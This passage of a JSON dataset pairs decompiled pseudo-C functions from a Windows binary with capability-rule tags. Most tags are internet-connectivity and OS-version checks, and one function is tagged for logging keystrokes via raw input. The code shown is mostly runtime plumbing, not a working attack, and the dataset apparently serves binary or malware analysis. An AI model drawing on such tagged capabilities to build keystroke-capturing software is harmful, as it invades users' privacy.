fcn.00420fe8(&stack0xfffffffc);\n        break;\n    case 0x10:\n        uVar5 = fcn.00420b70();\n        in_stack_ffffffb4 = uVar5;\n        fcn.0041926c(in_stack_ffffffb4, uVar5 >> 0x20);\n    }\n    *in_FS_OFFSET = in_stack_ffffffb4;\n    uStack68 = 0x4213b8;\n    fcn.004045ec();\n    fcn.00404cd4();\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 1235
    },
    "00421420": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421420(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint uStackY128;\n    uint uStackY124;\n    uchar *puStackY120;\n    uint uStackY116;\n    uint uStackY112;\n    uchar *puStackY108;\n    uint arg_8h;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack92 = &stack0xfffffffc;\n    uStack72 = 0x42173b;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x421459;\n    fcn.0042180c();\n    puStack80 = 0x421468;\n    (**(**0x48584c + 0x14))();\n    uStack84 = 0x421719;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 0x4216da;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack80 = &stack0xfffffffc;\n    (**(*in_EAX + 0x24))();\n    if (param_2 == NULL) {\n        fcn.00421830();\n        iVar1 = fcn.0041bc14();\n        var_ch = (**(iVar1 + 0x2c))();\n        fcn.00421830();\n        (**(*var_ch + 0x18))();\n    }\n    else {\n        fcn.00421830();\n        var_ch = param_2;\n        if ((*(param_2 + 7) & 0x10) == 0) {\n            *(param_2 + 7) = *(param_2 + 7) | 1;\n            *(param_2 + 7) = *(param_2 + 7) | 2;\n            fcn.00421830();\n            fcn.004213c0();\n            (**(*param_2 + 0x18))();\n        }\n        else {\n            fcn.00421830();\n        }\n    }\n    in_EAX[6] = var_ch;\n    arg_8h = 1;\n    puStackY108 = 0x421538;\n    fcn.00403764();\n    puStackY108 = 0x421546;\n    iVar1 = fcn.0041b964(arg_8h);\n    in_EAX[0x1d] = iVar1;\n    uStackY112 = 0x42167f;\n    uStackY116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    in_EAX[7] = var_ch;\n    puStackY120 = 0x421568;\n    puStackY108 = &stack0xfffffffc;\n    iVar1 = fcn.004069e0();\n    iVar1 = *(iVar1 + 8);\n    if (iVar1 == 0) {\n        puStackY120 = 0x42158e;\n        iVar2 = fcn.004037f0();\n        in_EAX[0xd] = iVar2;\n    }\n    else {\n        in_EAX[0xd] = iVar1;\n    }\n    uStackY124 = 0x42165f;\n    uStackY128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    puStackY120 = &stack0xfffffffc;\n    iVar2 = fcn.0041c52c();\n    if (iVar2 < 0) {\n        fcn.0041c358();\n    }\n    in_EAX[10] = in_EAX[6];\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 1;\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 2;\n    (**(*in_EAX[6] + 0x14))();\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) & 0xfffd;\n    if ((iVar1 == 0) && (iVar2 = *(in_EAX[0xd] + 8),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.0041c4c8();\n            (**(*piVar3 + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStackY128;\n    puStackY120 = 0x421666;\n    if (iVar1 == 0) {\n        uStackY124 = 0x421656;\n        fcn.00403820();\n    }\n    in_EAX[0xd] = 0;\n    return;\n}\n",
        "token_count": 1265
    },
    "0042174c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004217ae)\n// WARNING: Removing unreachable block (ram,0x004217be)\n\nvoid fcn.0042174c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    uStack36 = 0x4217fa;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x4217cd;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    cVar1 = fcn.00421a0c();\n    if (cVar1 != '\\v') {\n        fcn.0041fa94();\n    }\n    fcn.00418374();\n    fcn.00421830();\n    *in_FS_OFFSET = uStack52;\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x421801;\n    uStack36 = 0x4217f9;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 313
    },
    "00421a20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00421a20(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack20 = 0x421a5c;\n    fcn.00421830();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x421a63;\n    uStack20 = 0x421a5b;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 149
    },
    "00421da8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00421da8(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.00404660();\n    var_4h = 0;\n    if (*(in_EAX + 0x1c) != 0) {\n        var_4h = fcn.00422c44();\n    }\n    if (var_4h == 0) {\n        if (*(in_EAX + 0x52) != 0) {\n            (**(in_EAX + 0x50))(&var_4h, param_1);\n        }\n        if (var_4h == 0) {\n            var_10h = var_8h;\n            var_ch._0_1_ = 0xb;\n            uVar1 = 0;\n            fcn.0040c9d4(0, &var_10h);\n            fcn.00403fc0();\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 312
    },
    "00421ea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00421ea0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack12;\n    \n    iStack12 = fcn.0041fee8();\n    if (((iStack12 == 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x1c) != *(in_EAX + 0x18))) {\n        iStack12 = fcn.0041fee8();\n    }\n    if (*(in_EAX + 0x62) != 0) {\n        (**(in_EAX + 0x60))(&iStack12);\n    }\n    if (iStack12 != 0) {\n        cVar1 = fcn.00403a58();\n        if (cVar1 != '\\0') goto code_r0x00421f0a;\n    }\n    fcn.0041bb54();\ncode_r0x00421f0a:\n    return CONCAT44(iStack12, iStack12);\n}\n",
        "token_count": 228
    },
    "00422528": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00422528(void)\n\n{\n    sub.kernel32.dll_InitializeCriticalSection_1(0x48586c);\n    *0x485854 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0, 0x422558);\n    if (*0x485854 == 0) {\n        fcn.0040ded0();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "0042259c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0042259c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY108;\n    uint uStackY104;\n    uchar *puStackY100;\n    uint uStackY96;\n    uint uStackY92;\n    uchar *puStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint uStackY76;\n    uchar *puStackY72;\n    uint uStackY68;\n    uint uStackY64;\n    uint uStackY60;\n    uint uStackY56;\n    uchar *puStackY52;\n    uint uStackY48;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    puStackY100 = &fcn.0042259c::var_1h + 1;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != **0x484854) {\n        var_14h = sub.kernel32.dll_GetCurrentThreadId_1();\n        var_10h._0_1_ = 0;\n        uStackY48 = 0x4225da;\n        fcn.0040c9d4(0, &fcn.0042259c::var_14h);\n        uStackY48 = 0x4225df;\n        fcn.00403fc0();\n    }\n    if (in_EAX < 1) {\n        uStackY48 = 0x4225f1;\n        fcn.00422574();\n    }\n    else {\n        uStackY48 = 0x4225ea;\n        fcn.00422580();\n    }\n    var_ch = 0;\n    uStackY48 = 0x48586c;\n    puStackY52 = 0x422600;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStackY56 = 0x42272a;\n    uStackY60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStackY64 = var_ch;\n    uStackY68 = 0x4835d4;\n    puStackY72 = 0x42261c;\n    puStackY52 = &fcn.0042259c::var_1h + 1;\n    var_ch = sub.kernel32.dll_InterlockedExchange();\n    uStackY76 = 0x42270b;\n    uStackY80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if ((var_ch == 0) || (*(var_ch + 8) < 1)) {\n        var_1h._0_1_ = '\\0';\n    }\n    else {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((var_1h != '\\0') && (0 < *(var_ch + 8))) {\n        uStackY84 = 0x42265e;\n        puStackY72 = &fcn.0042259c::var_1h + 1;\n        var_8h = fcn.0041c4c8();\n        uStackY84 = 0x42266b;\n        fcn.0041c3a4();\n        uStackY84 = 0x48586c;\n        puStackY88 = 0x422675;\n        sub.kernel32.dll_LeaveCriticalSection_1();\n        uStackY92 = 0x4226d5;\n        uStackY96 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa0;\n        uStackY104 = 0x4226a6;\n        uStackY108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStackY88 = &fcn.0042259c::var_1h + 1;\n        (**(*var_8h + 8))();\n        *in_FS_OFFSET = uStackY108;\n        *in_FS_OFFSET = uStackY96;\n        puStackY88 = 0x4226dc;\n        uStackY92 = 0x48586c;\n        uStackY96 = 0x4226d4;\n        sub.kernel32.dll_EnterCriticalSection_1();\n        return;\n    }\n    *in_FS_OFFSET = uStackY80;\n    puStackY72 = 0x422712;\n    uStackY76 = 0x42270a;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 1030
    },
    "00422788": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00422788(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char extraout_DL;\n    \n    iVar1 = fcn.00403bc0();\n    fcn.004229dc();\n    if (*(iVar1 + 0x14) != 0) {\n        while ((*(iVar1 + 0x14) != 0 && (0 < *(*(iVar1 + 0x14) + 8)))) {\n            piVar2 = fcn.0041c4c8();\n            (**(*piVar2 + 0x10))();\n        }\n        fcn.0040e630();\n    }\n    fcn.00422984();\n    if (*(iVar1 + 4) != 0) {\n        fcn.0042294c();\n    }\n    fcn.0041cabc();\n    if ('\\0' < extraout_DL) {\n        fcn.00403ba8();\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "0042280c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042280c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 4) == 0) || (*(in_EAX + 4) != *(param_2 + 4))) {\n        if (*(in_EAX + 0x14) == 0) {\n            uVar1 = fcn.004037f0();\n            *(in_EAX + 0x14) = uVar1;\n        }\n        iVar2 = fcn.0041c52c();\n        if (iVar2 < 0) {\n            fcn.0041c358();\n            fcn.0042280c();\n        }\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x100;\n    return;\n}\n",
        "token_count": 207
    },
    "004228a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004228a0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        uVar1 = fcn.004037f0();\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.0041c358();\n    *(param_2 + 4) = in_EAX;\n    return;\n}\n",
        "token_count": 114
    },
    "004228cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004228cc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 4) = 0;\n    fcn.0041c688();\n    if (*(*(in_EAX + 0x10) + 8) == 0) {\n        fcn.00403820();\n        *(in_EAX + 0x10) = 0;\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00422a18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00422a18(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        fcn.0041c688();\n        if (*(*(in_EAX + 0x14) + 8) == 0) {\n            fcn.00403820();\n            *(in_EAX + 0x14) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00422a58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422a58(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((param_1 == '\\x01') && (param_2 != 0)) {\n        fcn.00422a3c();\n    }\n    if (*(in_EAX + 0x10) != 0) {\n        iVar2 = *(*(in_EAX + 0x10) + 8) + -1;\n        while (-1 < iVar2) {\n            piVar1 = fcn.0041c4c8();\n            (**(*piVar1 + 0x10))();\n            iVar2 = iVar2 + -1;\n            if (*(*(in_EAX + 0x10) + 8) <= iVar2) {\n                iVar2 = *(*(in_EAX + 0x10) + 8) + -1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 224
    },
    "00422bac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00422bac(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        cVar1 = fcn.004089f4();\n        if ((cVar1 == '\\0') && (in_EAX == *(in_EDX + 4))) {\n            iVar2 = fcn.00422c44();\n            if (iVar2 != 0) {\n                var_ch = arg_8h;\n                var_8h._0_1_ = 0xb;\n                fcn.0040c9d4(0, &var_ch);\n                fcn.00403fc0();\n            }\n        }\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 4) != 0)) {\n        (**(**(in_EAX + 4) + 0x20))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 269
    },
    "00422c44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00422c44(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (((param_2 != 0) && (*(in_EAX + 0x10) != 0)) && (iVar3 = *(*(in_EAX + 0x10) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.0041c4c8();\n            cVar1 = fcn.004089f4();\n            if (cVar1 != '\\0') goto code_r0x00422c89;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    uVar2 = 0;\ncode_r0x00422c89:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 211
    },
    "00422d34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00422d34(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        fcn.0041c444();\n    }\n    fcn.0041c4c8();\n    return;\n}\n",
        "token_count": 64
    },
    "00422dc4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422dc4(char param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) & 0xffef;\n    }\n    else {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x10;\n    }\n    if ((param_1 != '\\0') && (iVar1 = fcn.00422d60(),  -1 < iVar1 + -1)) {\n        do {\n            fcn.00422d34();\n            fcn.00422dc4();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00422e14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422e14(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    if (*(in_EAX + 4) != 0) {\n        fcn.00404864();\n        piVar1 = fcn.00403b08();\n        if (piVar1 != NULL) {\n            if (param_2 == '\\0') {\n                *piVar1 = 0;\n            }\n            else {\n                *piVar1 = in_EAX;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00422edc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00422edc(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        cVar1 = fcn.004038d4();\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = (****(arg_8h + 0x20))(*(arg_8h + 0x20), arg_ch, arg_10h);\n    }\n    return uVar2;\n}\n",
        "token_count": 163
    },
    "00423098": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00423098(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00403bc0();\n    fcn.00422788();\n    if (*(iVar1 + 0x30) != 0) {\n        fcn.00422a3c();\n    }\n    while (0 < *(*(iVar1 + 0x50) + 8)) {\n        fcn.0041c5b8();\n        fcn.004231d8();\n    }\n    fcn.0040e630();\n    if ('\\0' < extraout_DL) {\n        fcn.00403ba8();\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00423124": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00423124(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x42) != 0) {\n        (**(in_EAX + 0x40))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 63
    },
    "00423140": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00423140(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x4a) != 0) {\n        (**(in_EAX + 0x48))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 64
    },
    "004232c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004232c4(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x423313;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0xc))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 226
    },
    "0042332c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042332c(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x42337b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0x10))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 228
    },
    "0042347c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0042347c(int32_t arg_8h, int32_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t *arg_18h, uint32_t *arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    puStack60 = 0x42348d;\n    fcn.0040630c();\n    uStack64 = 0x42366f;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_4h = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    uStack76 = 0x423648;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if (arg_14h == 0) {\n        if (arg_10h < 0x100001) {\ncode_r0x004234e6:\n            var_ch = arg_10h;\n            goto code_r0x004234ec;\n        }\n    }\n    else if (arg_14h < 1) goto code_r0x004234e6;\n    var_ch = 0x100000;\ncode_r0x004234ec:\n    puStack84 = 0x4234f4;\n    puStack60 = &stack0xfffffffc;\n    var_8h = fcn.00402b14();\n    uStack88 = 0x423637;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    do {\n        if (arg_14h == 0) {\n            if (arg_10h == 0) {\ncode_r0x004235f7:\n                *in_FS_OFFSET = uStack92;\n                puStack84 = 0x42363e;\n                uStack88 = 0x42360c;\n                fcn.00402b44();\n                if (arg_1ch != NULL) {\n                    *arg_1ch = var_20h;\n                    arg_1ch[1] = var_1ch;\n                }\n                if (arg_18h != 